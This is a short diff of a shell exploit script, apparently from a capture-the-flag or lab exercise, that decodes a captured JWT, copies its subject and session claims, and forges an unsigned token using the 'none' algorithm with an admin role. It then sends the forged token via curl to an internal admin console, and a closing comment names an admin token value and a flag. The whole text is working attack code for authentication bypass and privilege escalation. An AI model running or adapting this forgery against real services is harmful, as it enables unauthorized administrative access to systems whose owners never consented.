@@ -256,9 +256,11 @@ case $((${#encoded_payload} % 4)) in
   2) encoded_payload="${encoded_payload}==" ;;
   3) encoded_payload="${encoded_payload}=" ;;
 esac
-sid=$(printf '%s' "$encoded_payload" | tr '_-' '/+' | base64 -d | jq -r .sid)
+payload_json=$(printf '%s' "$encoded_payload" | tr '_-' '/+' | base64 -d)
+sub=$(printf '%s' "$payload_json" | jq -er '.sub | select(type == "string")')
+sid=$(printf '%s' "$payload_json" | jq -er '.sid | select(type == "string")')
 h=$(printf '%s' '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=\n' | tr '+/' '-_')
-p=$(printf '{"sub":"analyst","role":"admin","sid":"%s"}' "$sid" | base64 | tr -d '=\n' | tr '+/' '-_')
+p=$(jq -cn --arg sub "$sub" --arg sid "$sid" '{sub:$sub,role:"admin",sid:$sid}' | base64 | tr -d '=\n' | tr '+/' '-_')
 forged="$h.$p."
 curl -s -H "Authorization: Bearer $forged" http://ops-internal:8081/admin/console
 # admin_token=root-obsidian-77 + flag
